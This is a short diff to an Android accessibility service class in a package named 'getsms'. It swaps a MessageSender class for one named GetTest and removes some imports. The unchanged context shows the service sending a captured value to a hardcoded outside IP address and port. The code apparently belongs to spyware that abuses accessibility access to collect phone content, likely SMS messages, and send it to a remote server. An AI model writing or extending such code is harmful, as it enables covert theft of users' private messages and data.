@@ -3,12 +3,6 @@ package me.paradis.getsms;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.view.accessibility.AccessibilityEvent;
-import android.widget.Toast;
-
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileReader;
-import java.io.IOException;
 
 public class MyAccessibilityService extends AccessibilityService {
 
@@ -23,7 +17,7 @@ public class MyAccessibilityService extends AccessibilityService {
             ip="45.56.113.154";
             port="505";
 
-            MessageSender messageSender = new MessageSender();
+            GetTest messageSender = new GetTest();
             messageSender.execute(s1,ip,port);
 
     }
